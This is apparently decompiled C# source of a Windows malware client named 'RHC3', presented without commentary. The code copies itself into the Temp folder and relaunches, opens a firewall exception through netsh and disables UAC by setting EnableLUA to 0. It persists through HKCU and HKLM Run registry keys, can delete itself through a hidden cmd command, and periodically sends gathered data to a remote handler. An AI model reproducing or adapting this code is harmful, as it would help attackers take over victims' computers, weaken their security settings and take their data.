using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

public sealed class GClass0
{
	internal sealed class Class6
	{
		public GClass1 gclass1_0;

		public Class6(Class6 class6_0)
		{
			if (class6_0 != null)
			{
				gclass1_0 = class6_0.gclass1_0;
			}
		}
	}

	public static GClass1 gclass1_0;

	public string string_0;

	public static string string_1 = Interaction.Environ("Temp") + "\\";

	public static string string_2 = "RHC3.exe";

	public static string string_3 = "RHC3";

	public static string string_4 = "RHC3";

	public static Mutex mutex_0;

	public static bool bool_0 = true;

	public GClass0()
	{
		string_0 = "1.3";
	}

	public void method_0(int int_0, string string_5, int int_1)
	{
		checked
		{
			if (gclass1_0 != null)
			{
				GClass1.bool_0 = true;
				while (true)
				{
					IL_0033:
					int num = gclass1_0.string_2.Length - 1;
					int num2 = 0;
					while (num2 <= num)
					{
						if (Operators.CompareString(gclass1_0.string_2[num2], "!", false) == 0)
						{
							num2++;
							continue;
						}
						goto IL_0033;
					}
					break;
				}
			}
			GClass1.int_0 = int_1;
			gclass1_0 = new GClass1();
			GClass1.gclass0_0 = this;
			GClass1.string_1 = string_5;
			GClass1.bool_0 = false;
			gclass1_0.string_2 = new string[int_0 - 1 + 1];
			Class6 class6_ = default(Class6);
			Class6 CS_0024_003C_003E8__locals0 = new Class6(class6_);
			CS_0024_003C_003E8__locals0.gclass1_0 = gclass1_0;
			Thread thread = new Thread(delegate(object object_0)
			{
				CS_0024_003C_003E8__locals0.gclass1_0.method_2(Conversions.ToInteger(object_0));
			}, 100);
			thread.Start(int_1);
		}
	}

	public void method_1()
	{
		try
		{
			string fileName = Process.GetCurrentProcess().MainModule!.FileName;
			int id = Process.GetCurrentProcess().Id;
			try
			{
				Process[] processesByName = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
				foreach (Process process in processesByName)
				{
					if (Operators.CompareString(process.MainModule!.FileName!.ToLower(), fileName.ToLower(), false) == 0 && process.Id > id)
					{
						ProjectData.EndApp();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void method_2()
	{
		try
		{
			Class7.string_1 = Interaction.Environ("temp") + "\\";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Class7.gclass0_0 = this;
		GClass2.gclass0_0 = this;
		method_5();
		checked
		{
			if (Operators.CompareString(string_2.ToLower(), Strings.Split(Application.get_ExecutablePath(), "\\", -1, (CompareMethod)0)[Strings.Split(Application.get_ExecutablePath(), "\\", -1, (CompareMethod)0).Length - 1].ToLower(), false) != 0)
			{
				string_2 = Strings.Split(Application.get_ExecutablePath(), "\\", -1, (CompareMethod)0)[Strings.Split(Application.get_ExecutablePath(), "\\", -1, (CompareMethod)0).Length - 1];
				string_1 = Application.get_StartupPath() + "\\";
			}
			try
			{
				Mutex.OpenExisting(string_4);
				ProjectData.EndApp();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			mutex_0 = new Mutex(initiallyOwned: true, string_4);
		}
	}

	public void method_3()
	{
		method_4(bool_1: false);
		GClass2.smethod_3();
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.Arguments = "/k ping 0 & del \"" + Application.get_ExecutablePath() + "\" & exit";
			Process.Start(processStartInfo);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public void method_4(bool bool_1)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "netsh.exe";
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			string text = ((!bool_1) ? "firewall delete allowedprogram X" : "firewall add allowedprogram X Y ENABLE");
			processStartInfo.Arguments = text.Replace("X", "\"" + Application.get_ExecutablePath() + "\"").Replace("Y", "\"" + Strings.Split(Application.get_ExecutablePath(), "\\", -1, (CompareMethod)0)[checked(Strings.Split(Application.get_ExecutablePath(), "\\", -1, (CompareMethod)0).Length - 1)] + "\"");
			Process.Start(processStartInfo)!.WaitForExit(1000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_5()
	{
		if (Operators.CompareString(Application.get_ExecutablePath().ToLower(), string_1.ToLower() + string_2.ToLower(), false) != 0)
		{
			try
			{
				File.Copy(Application.get_ExecutablePath(), string_1 + string_2, overwrite: true);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = string_1 + string_2;
				if (bool_0)
				{
					processStartInfo.Arguments = "@MTL:" + Application.get_StartupPath();
				}
				Process.Start(processStartInfo);
				ProjectData.EndApp();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				if (File.Exists(string_1 + string_2))
				{
					ProjectData.EndApp();
				}
				ProjectData.ClearProjectError();
			}
		}
		method_4(bool_1: true);
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object)0, RegistryValueKind.DWord);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	[STAThread]
	public static void Main()
	{
		GClass0 gClass = new GClass0();
		Thread thread = new Thread(gClass.method_6);
		thread.Start();
	}

	public void method_6()
	{
		int num = 0;
		int num2 = 0;
		string[] array = Strings.Split(Interaction.Command(), "@", -1, (CompareMethod)0);
		string[] array2 = array;
		foreach (string text in array2)
		{
			string[] array3 = Strings.Split(text, ":", -1, (CompareMethod)0);
			string text2 = array3[0];
			if (Operators.CompareString(text2, "MLT", false) == 0)
			{
				try
				{
					File.Delete(array3[1]);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(text2, "..", false) == 0)
			{
				Thread.Sleep(2000);
			}
		}
		method_2();
		method_1();
		Thread thread = new Thread(Class7.smethod_2().method_7, 100);
		thread.Start();
		method_0(1, "@hotmail.com", 2);
		checked
		{
			while (true)
			{
				Thread.Sleep(1000);
				if (Class7.bool_0 && gclass1_0 != null)
				{
					num2++;
					try
					{
						if (GClass1.list_0.Count > 0)
						{
							string[] array4 = GClass1.list_0.ToArray();
							GClass1.list_0.Clear();
							string text3 = "!3";
							string[] array5 = array4;
							foreach (string text4 in array5)
							{
								text3 = text3 + Class7.string_0 + text4;
							}
							Class7.smethod_2().method_10(text3);
						}
						if (num2 > 6)
						{
							num2 = 0;
							Class7.smethod_2().method_10("!4" + Class7.string_0 + "!" + Class7.string_0 + Conversions.ToString(GClass1.int_2) + "|" + Conversions.ToString(gclass1_0.string_0.Length));
							Class7.smethod_2().method_10("!4" + Class7.string_0 + "@" + Class7.string_0 + Conversions.ToString(GClass1.int_1));
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				num++;
				if (num != 4)
				{
					continue;
				}
				num = 0;
				if (string_3.Length <= 0)
				{
					continue;
				}
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(string_3), (object)null, false))
					{
						registryKey.SetValue(string_3, "\"" + Application.get_ExecutablePath() + "\" @..");
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					if (Operators.ConditionalCompareObjectEqual(registryKey2.GetValue(string_3), (object)null, false))
					{
						registryKey2.SetValue(string_3, "\"" + Application.get_ExecutablePath() + "\"");
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
